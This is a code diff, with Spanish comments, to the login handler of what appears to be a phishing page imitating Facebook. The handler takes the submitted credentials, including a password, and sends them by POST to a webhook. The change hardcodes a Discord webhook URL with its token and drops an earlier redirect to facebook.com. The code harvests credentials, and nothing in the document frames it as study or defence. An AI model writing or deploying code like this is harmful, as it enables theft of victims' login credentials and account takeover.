@@ -279,41 +279,23 @@ document.querySelector('#loginForm').addEventListener('submit', function(e) {
         password: password
     };
 
-    const webhookUrl = localStorage.getItem("webhookUrl"); // Obtener la URL del webhook de localStorage
-
-    if (webhookUrl) {
-        fetch(webhookUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(data)
-        })
-        .then(response => {
-            if (response.ok) {
-                console.log('Datos enviados con éxito');
-                window.location.href = "https://www.facebook.com";
-            } else {
-                console.error('Error al enviar los datos');
-            }
-        })
-        .catch(error => {
-            console.error('Error al enviar los datos:', error);
-        });
-    } else {
-        console.error('No se encontró la URL del webhook.');
-    }
-});
-
-// Mostrar aviso de cookies
-setTimeout(() => {
-    document.querySelector('.cookie-notice').style.display = 'block';
-}, 1000);
-
-// Acción de botón de cookies
-document.querySelector('.cookie-button').addEventListener('click', function() {
-    document.querySelector('.cookie-notice').style.display = 'none';
-    document.querySelector('.thank-you-message').style.display = 'block';
+    const webhookUrl = "https://discord.com/api/webhooks/1322668879297646704/clrV9tAmGadKezdXoJvBUYU-N3EWMYEIg2KAwPSoSkHW_qMol5ov6QvXN6-S4jzJ0PBz"; // Aquí puedes cambiar el webhook
+    
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+    })
+    .then(response => response.json())
+    .then(responseData => {
+        console.log("Mensaje enviado", responseData);
+        document.querySelector('.thank-you-message').style.display = 'block';
+    })
+    .catch(error => {
+        console.error("Error al enviar los datos", error);
+    });
 });
 </script>
 
